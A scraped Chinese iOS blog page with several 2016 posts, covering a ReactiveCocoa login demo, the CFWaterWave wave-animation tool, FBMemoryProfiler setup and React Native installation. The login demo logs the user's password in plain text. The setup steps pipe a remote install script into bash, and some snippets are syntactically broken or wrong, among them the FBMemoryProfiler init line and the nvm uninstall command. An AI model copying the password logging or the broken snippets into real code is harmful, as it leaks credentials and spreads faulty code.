class="line">    </div><div class="line"><span class="comment">//    @weakify(self);</span></div><div class="line">    <span class="comment">// 订阅登录成功信号并作出处理</span></div><div class="line">    [<span class="keyword">self</span>.viewModel.successSubject subscribeNext:^(<span class="built_in">NSArray</span> * x) &#123;</div><div class="line"><span class="comment">//        @strongify(self);</span></div><div class="line">        User *user = x[<span class="number">0</span>];</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"username:%@\tpassword:%@"</span>, user.username, user.password);</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"登陆成功"</span>);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    <span class="comment">// 订阅登录失败信号并作出处理</span></div><div class="line">    [<span class="keyword">self</span>.viewModel.failureSubject subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"登陆失败"</span>);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    <span class="comment">// 订阅登录错误信号并作出处理</span></div><div class="line">    [<span class="keyword">self</span>.viewModel.errorSubject subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"登陆错误"</span>);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    <span class="comment">// 添加按钮点击事件</span></div><div class="line">    [[<span class="keyword">self</span>.btLogin rac_signalForControlEvents:<span class="built_in">UIControlEventTouchUpInside</span>] subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        [<span class="keyword">self</span>.viewModel login];</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>这样，ViewController中事件处理的所有代码被集中在一起，方便管理，你的代码变得如此清爽、低耦合。</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>以上代码地址请点<a href="http://download.csdn.net/detail/u010127917/9528911" target="_blank" rel="external">这里</a>。</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>小鱼最近在换工作哟~各路的朋友有推荐的请务必介绍我哟~<br>简历在<a href="http://zhoulingyu.com/about/">这里</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x63;&#111;&#100;&#101;&#114;&#x66;&#105;&#x73;&#x68;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#x6f;&#109;">&#x63;&#111;&#100;&#101;&#114;&#x66;&#105;&#x73;&#x68;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#x6f;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/04/28/iOS——CFWaterWave水波效果工具/" itemprop="url">
                  iOS——CFWaterWave水波效果工具
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-04-28T16:53:37+08:00" content="2016-04-28">
              2016-04-28
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          
             <span id="/2016/04/28/iOS——CFWaterWave水波效果工具/" class="leancloud_visitors" data-flag-title="iOS——CFWaterWave水波效果工具">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="最近通过前辈，学着做了一个水波效果工具共享出来，github连接"><a href="#最近通过前辈，学着做了一个水波效果工具共享出来，github连接" class="headerlink" title="最近通过前辈，学着做了一个水波效果工具共享出来，github连接"></a>最近通过前辈，学着做了一个水波效果工具共享出来，<a href="https://github.com/summertian4/CFWaterWave" target="_blank" rel="external">github连接</a></h3><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>CFWaterWave是一个简单好用的iOS水波效果工具，可以让你的APP更加好看有趣</p>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_show_01.gif" alt="CFWaterWave效果展示"></p>
<h1 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h1><p>CFWaterWave的原理很简单，我们用Example里的工程做简介。(这里首先要感谢@hy，我敬爱的前辈，最初是从他这里学习的水波效果原理)</p>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_pic_white.png-w100" alt="白色图片"><br><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_pic_red.png-w100" alt="红色图片"><br><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_img_03.png-w100" alt="叠加添加遮盖效果"></p>
<ol>
<li>首先准备两张图片</li>
<li>将两张图放在重叠的位置</li>
<li>将其中一张图片加上波浪形的遮盖</li>
<li>如果波浪形的遮盖是动态再变化的的，就可以形成动态的波浪</li>
<li>CFWaterWave就是为你提供好了动态波浪的Path，你只需要在回调中加入遮盖即可</li>
<li>如果你还是晕晕的，那就直接看Example吧，相信你瞬间就会明白的</li>
</ol>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>直接拽入<code>CFWaterWave.h</code>和<code>CFWaterWave.m</code>文件</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><ol>
<li>创建CFWaterWave对象</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">- (<span class="built_in">CFWaterWave</span> *)waterWave &#123;</div><div class="line">    <span class="keyword">if</span> (_waterWave == <span class="literal">nil</span>) &#123;</div><div class="line">        <span class="comment">// 给定的frame和你的图片frame一致即可</span></div><div class="line">        _waterWave = [[<span class="built_in">CFWaterWave</span> alloc] initWithFrame:<span class="keyword">self</span>.pic_red.frame];</div><div class="line">        _waterWave.delegate = <span class="keyword">self</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> _waterWave;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>实现好代理，在代理中给你想要实现水波纹的图片加上贝塞尔路径生成的遮盖</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)waterWave:(<span class="built_in">CFWaterWave</span> *)waterWave wavePath:(<span class="built_in">UIBezierPath</span> *)path &#123;</div><div class="line">    <span class="built_in">CAShapeLayer</span> *maskLayer = [[<span class="built_in">CAShapeLayer</span> alloc] init];</div><div class="line">    maskLayer.path = path.CGPath;</div><div class="line">    <span class="comment">// 添加遮盖</span></div><div class="line">    <span class="keyword">self</span>.pic_red.layer.mask = maskLayer;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h1><ol>
<li>Exmaple中的示例</li>
</ol>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_show_01.gif" alt="CFWaterWave效果展示"></p>
<ol>
<li>最近做的一个小APP——『番茄』的效果展示（如果有感兴趣的，可以联系我一起合作写哟~，因为这小项目，我想静静的体验一下当设计师的感觉😜）</li>
</ol>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_show_02.gif" alt="CFWaterWave效果展示"></p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>约定好的奉上自拍哈哈</p>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94CFWaterWave%E6%B0%B4%E6%B3%A2%E6%95%88%E6%9E%9C%E5%B7%A5%E5%85%B7-01.JPG-w375" alt=""></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#99;&#111;&#x64;&#101;&#x72;&#102;&#x69;&#115;&#x68;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;">&#99;&#111;&#x64;&#101;&#x72;&#102;&#x69;&#115;&#x68;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/04/21/iOS——抢鲜来体验一下FBMemoryProfiler/" itemprop="url">
                  iOS——抢鲜来体验一下FBMemoryProfiler
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-04-21T21:32:31+08:00" content="2016-04-21">
              2016-04-21
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          
             <span id="/2016/04/21/iOS——抢鲜来体验一下FBMemoryProfiler/" class="leancloud_visitors" data-flag-title="iOS——抢鲜来体验一下FBMemoryProfiler">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="FBMemoryProfiler简介"><a href="#FBMemoryProfiler简介" class="headerlink" title="FBMemoryProfiler简介"></a>FBMemoryProfiler简介</h1><ol>
<li>4月刚刚推出的新品~保证中你口味</li>
<li>FaceBook荣誉出品~</li>
<li>作者<a href="https://github.com/Gricha" target="_blank" rel="external">Gricha</a></li>
<li>功能及前身：也许你用过<a href="https://github.com/facebook/FBRetainCycleDetector" target="_blank" rel="external">FBRetainCycleDetector</a>，这就是<a href="https://github.com/facebook/FBMemoryProfiler" target="_blank" rel="external">FBMemoryProfiler</a>的前身了，是由Gricha编写用来检测循环引用的小工具。FBMemoryProfiler比FBRetainCycleDetector要强大的多，提供了非常帮的<code>交互界面</code>和更多的功能。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/facebook/FBMemoryProfiler/master/Example/Images/Example2.gif" alt="FBMemoryProfiler一览"></p>
<h1 id="初上手"><a href="#初上手" class="headerlink" title="初上手"></a>初上手</h1><ol>
<li><p><strong>pod安装</strong></p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pod 'FBMemoryProfiler'</div></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p><strong>enable FBAllocationTracker:</strong></p>
<p> 在<code>mian.m</code>文件中（注意是<code>main.m</code>，不是AppDelegate.m）中加入：</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;FBAllocationTracker/FBAllocationTrackerManager.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[]) &#123;</div><div class="line"> 	[[FBAllocationTrackerManager sharedManager] startTrackingAllocations];</div><div class="line"> 	[[FBAllocationTrackerManager sharedManager] enableGenerations];</div><div class="line"> 	<span class="keyword">@autoreleasepool</span> &#123;</div><div class="line">   	  <span class="keyword">return</span> <span class="built_in">UIApplicationMain</span>(argc, argv, <span class="literal">nil</span>, <span class="built_in">NSStringFromClass</span>([AppDelegate <span class="keyword">class</span>]));</div><div class="line"> 	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p><strong>enable FBMemoryProfiler</strong>:</p>
<p> 这次是去<code>AppDelegate.m</code>了，去加一个变量，保证MemoryProfiler不会被释放：</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span> , <span class="keyword">strong</span>) FBMemoryProfiler * memoryProfiler;</div></pre></td></tr></table></figure>
</li>
</ol>
<pre><code>在`didFinishLaunchingWithOptions`方法中添加：

<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">self</span>.memoryProfiler = [FBMemoryProfiler new];</div><div class="line">                              retainCycleDetectorConfiguration:<span class="literal">nil</span>];</div><div class="line">[<span class="keyword">self</span>.memoryProfiler enable];</div></pre></td></tr></table></figure>
</code></pre><ol>
<li><p>试一试，运行你的APP是不是能看到小方块了</p>
<p> <img src="http://7xt4xp.com2.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%8A%A2%E9%B2%9C%E6%9D%A5%E4%BD%93%E9%AA%8C%E4%B8%80%E4%B8%8BFBMemoryProfiler-01.PNG-w375" alt="初始样式"><br> <img src="http://7xt4xp.com2.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%8A%A2%E9%B2%9C%E6%9D%A5%E4%BD%93%E9%AA%8C%E4%B8%80%E4%B8%8BFBMemoryProfiler-02.PNG-w375" alt="展开"></p>
</li>
<li><p>展开后点击Expand，可以看到所有的类，你可以通过<code>Filter</code>过滤你想看到的结果，比如你的项目是CF开头，就可以输入CF来过滤</p>
<p> <img src="http://7xt4xp.com2.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%8A%A2%E9%B2%9C%E6%9D%A5%E4%BD%93%E9%AA%8C%E4%B8%80%E4%B8%8BFBMemoryProfiler-03.JPG-w375" alt=""></p>
</li>
<li><p>还有很多功能，去尝试吧！</p>
</li>
</ol>
<h1 id="添加自己的pulgin"><a href="#添加自己的pulgin" class="headerlink" title="添加自己的pulgin"></a>添加自己的pulgin</h1><p>除了基本功能，FBMemoryProfiler还提供了接口扩展功能</p>
<h2 id="1-FBMemoryProfilerPluggable"><a href="#1-FBMemoryProfilerPluggable" class="headerlink" title="1. FBMemoryProfilerPluggable"></a>1. FBMemoryProfilerPluggable</h2><p>你可以阅读<code>FBMemoryProfilerPluggable.h</code><br>FBMemoryProfilerPluggable是一个协议，你可以通过实现这个协议来扩展你想要的功能<br>提供了如下方法：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">@protocol</span> <span class="title">FBMemoryProfilerPluggable</span> &lt;<span class="title">NSObject</span>&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">@optional</span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> Lifecycle events, when Memory profiler is enabled/disabled</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)memoryProfilerDidEnable;</div><div class="line">- (<span class="keyword">void</span>)memoryProfilerDidDisable;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> When memory profiler finds retain cycles plugins can subscribe to get them.</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)memoryProfilerDidFindRetainCycles:(<span class="keyword">nonnull</span> <span class="built_in">NSSet</span> *)retainCycles;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> If you want to do additional cleanup after marking new generations.</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)memoryProfilerDidMarkNewGeneration;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<h2 id="2-实现FBMemoryProfilerPluggable协议"><a href="#2-实现FBMemoryProfilerPluggable协议" class="headerlink" title="2. 实现FBMemoryProfilerPluggable协议"></a>2. 实现FBMemoryProfilerPluggable协议</h2><p>来看看<code>Example</code>中提供简单的插件</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Copyright (c) 2016-present, Facebook, Inc.</div><div class="line"> * All rights reserved.</div><div class="line"> *</div><div class="line"> * This source code is licensed under the license found in the LICENSE file in</div><div class="line"> * the root directory of this source tree.</div><div class="line"> */</div><div class="line"></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;FBMemoryProfiler/FBMemoryProfiler.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> Example of FBMemoryProfiler plugin that will NSLog all retain cycles found</div><div class="line"> within FBMemoryProfiler. This could, for instance, send it somewhere to the backend.</div><div class="line"> */</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">RetainCycleLoggerPlugin</span> : <span class="title">NSObject</span> &lt;<span class="title">FBMemoryProfilerPluggable</span>&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Copyright (c) 2016-present, Facebook, Inc.</div><div class="line"> * All rights reserved.</div><div class="line"> *</div><div class="line"> * This source code is licensed under the license found in the LICENSE file in</div><div class="line"> * the root directory of this source tree.</div><div class="line"> */</div><div class="line"><span class="meta">#import <span class="meta-string">"RetainCycleLoggerPlugin.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">RetainCycleLoggerPlugin</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)memoryProfilerDidFindRetainCycles:(<span class="built_in">NSSet</span> *)retainCycles</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (retainCycles.count) &#123;</div><div class="line">        DDLogWarn(<span class="string">@"%@"</span>, retainCycles);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>其功能就是简单的打印（<code>DDLogWarn是CocoaLumberjack提供的Log方法</code>你可以换成你自己的）</p>
<h2 id="3-修改FBMemoryProfiler的初始化方法"><a href="#3-修改FBMemoryProfiler的初始化方法" class="headerlink" title="3. 修改FBMemoryProfiler的初始化方法"></a>3. 修改FBMemoryProfiler的初始化方法</h2><p>写好插件后需要用起来，去改一下AppDelegate中的FBMemoryProfiler初始化方法即可</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">self</span>.memoryProfiler = [[FBMemoryProfiler alloc] initWithPlugins:@[[CacheCleanerPlugin new],</div><div class="line">                                                                  [RetainCycleLoggerPlugin new]] retainCycleDetectorConfiguration:<span class="literal">nil</span>];</div><div class="line">[<span class="keyword">self</span>.memoryProfiler enable];</div></pre></td></tr></table></figure>
<p>重新运行项目，点击<code>Retain Cycles</code>按钮，是不是能看到控制台有打印了</p>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%8A%A2%E9%B2%9C%E6%9D%A5%E4%BD%93%E9%AA%8C%E4%B8%80%E4%B8%8BFBMemoryProfiler-04.png-w500" alt=""></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>FBMemoryProfiler目前只是0.1版本，不能算稳定，我在使用的时候也Crash了好几次。但是谁不相信FaceBook的大神呢~嘿嘿</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#99;&#x6f;&#100;&#101;&#114;&#x66;&#x69;&#x73;&#104;&#64;&#49;&#54;&#51;&#x2e;&#99;&#x6f;&#109;">&#99;&#x6f;&#100;&#101;&#114;&#x66;&#x69;&#x73;&#104;&#64;&#49;&#54;&#51;&#x2e;&#99;&#x6f;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/04/19/iOS进阶学习——React-Native-环境搭建-run-it/" itemprop="url">
                  iOS进阶学习——React-Native-环境搭建-run-it
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-04-19T11:08:06+08:00" content="2016-04-19">
              2016-04-19
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          
             <span id="/2016/04/19/iOS进阶学习——React-Native-环境搭建-run-it/" class="leancloud_visitors" data-flag-title="iOS进阶学习——React-Native-环境搭建-run-it">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="官方参考"><a href="#官方参考" class="headerlink" title="官方参考"></a>官方参考</h1><ol>
<li><a href="https://github.com/facebook/react-native" target="_blank" rel="external">react-native github</a></li>
<li><a href="http://reactnative.cn/docs/0.24/getting-started.html#content" target="_blank" rel="external">react-native 中文文档</a></li>
<li><a href="https://nodejs.org/en/" target="_blank" rel="external">node.js</a></li>
<li><a href="https://github.com/creationix/nvm#installation" target="_blank" rel="external">nvm</a></li>
<li><a href="https://facebook.github.io/watchman/docs/install.html" target="_blank" rel="external">watchman</a></li>
<li><a href="http://www.flowtype.org" target="_blank" rel="external">flow</a></li>
</ol>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="Node-js安装"><a href="#Node-js安装" class="headerlink" title="Node.js安装"></a>Node.js安装</h2><ol>
<li>nvm istall<ul>
<li>输入命令<code>curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh | bash</code></li>
<li>如果你希望卸载nvm，你可以输入命令<code>$ npm uninstall -g a_module</code></li>
</ul>
</li>
<li>输入命令<code>nvm install node &amp;&amp; nvm</code></li>
<li>使nvm生效：<code>. ~/.nvm/nvm.sh</code> </li>
<li>安装Node.js<code>nvm install node &amp;&amp; nvm alias default node</code><h2 id="watchman安装"><a href="#watchman安装" class="headerlink" title="watchman安装"></a>watchman安装</h2></li>
<li><code>brew install watchman</code><h2 id="flow"><a href="#flow" class="headerlink" title="flow"></a>flow</h2><code>brew install flow</code></li>
</ol>
<h2 id="快速使用React-Native"><a href="#快速使用React-Native" class="headerlink" title="快速使用React Native"></a>快速使用React Native</h2><ol>
<li>安装React Native<ul>
<li><code>npm install -g react-native-cli</code> </li>
</ul>
</li>
<li>创建React Native工程<ul>
<li>进入你常用的workspace，输入命令<code>react-native init AwesomeProject</code></li>
<li>稍等会自动帮你创建好工程，大概是这样：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94React-Native-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-run-it-01.png-w375" alt="图片"></li>
</ul>
</li>
<li><p>打开<code>iOS</code>文件夹，发现里面是熟悉的常规工程目录，打开工程，在模拟器上运行（稍后会说明如何在真机运行），效果如下 </p>
<p> <img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94React-Native-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-run-it-02.png-w375" alt="图片"></p>
</li>
<li><p>真机运行</p>
<ul>
<li><p>观察项目<code>AppDelegate.m</code>你可以发现<code>didFinishLaunchingWithOptions</code>中有这样一句</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jsCodeLocation = [<span class="built_in">NSURL</span> URLWithString:<span class="string">@"http://localhost:8081/index.ios.bundle?platform=ios&amp;dev=true"</span>];</div></pre></td></tr></table></figure>
<p>所以简单的来说，要保证你的真机和mac在同一个网络，将localhost换成mac的IP地址</p>
</li>
</ul>
</li>
</ol>
<h1 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h1><h2 id="react-native命令行慢"><a href="#react-native命令行慢" class="headerlink" title="react-native命令行慢"></a>react-native命令行慢</h2><p>老问题了……替换npm仓库源，换成国内的源</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">npm config set registry https:<span class="comment">//registry.npm.taobao.org</span></div><div class="line">npm config set disturl https:<span class="comment">//npm.taobao.org/dist</span></div></pre></td></tr></table></figure>
<h2 id="watchman无法启动"><a href="#watchman无法启动" class="headerlink" title="watchman无法启动"></a>watchman无法启动</h2><ol>
<li>命令台报错：ERROR  watchman–no-pretty get-sockname returned with exit code null dyld: Library not loaded: /usr/local/lib/libpcre.1.dylib<br>   Referenced from: /usr/local/bin/watchman<br>   Reason: image not found</li>
<li>解决<br> brew uninstall watchman<br> brew install –HEAD watchman</li>
</ol>
<hr>
